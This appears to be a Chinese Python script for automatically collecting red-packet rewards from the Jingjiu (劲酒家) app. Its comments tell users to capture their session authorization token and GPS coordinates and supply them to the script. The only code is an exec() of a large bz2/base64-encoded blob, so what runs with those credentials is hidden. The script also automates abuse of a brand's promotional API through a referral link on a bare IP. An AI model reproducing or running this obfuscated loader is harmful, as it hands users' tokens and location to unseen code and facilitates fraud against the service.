
#   --------------------------------注释区--------------------------------
#   入口http://103.225.198.104:5212/s/9lS3 劲酒家.jpg
#   抓任意接口 authorization参数的值
#   抓https://cdp-api.jingpai.com/v1/collector/pushevent?access_token=这个接口或其他接口的lat和lon
#   变量:yuanshen_jjj 多号： @分割
#   格式：authorization的值# lat的值 # lon的值
#   ck貌似一天一过期，中红包要买劲酒码自己激活
#   --------------------------------一般不动区-------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
# 
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#佛曰:  
#        写字楼里写字间，写字间里程序员；  
#        程序人员写程序，又拿程序换酒钱。  
#        酒醒只在网上坐，酒醉还来网下眠；  
#        酒醉酒醒日复日，网上网下年复年。  
#        但愿老死电脑间，不愿鞠躬老板前；  
#        奔驰宝马贵者趣，公交自行程序员。  
#        别人笑我忒疯癫，我笑自己命太贱；  
#        不见满街漂亮妹，哪个归得程序员？
#
#   --------------------------------代码区--------------------------------
import bz2, base64
exec(bz2.decompress(base64.b64decode('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')))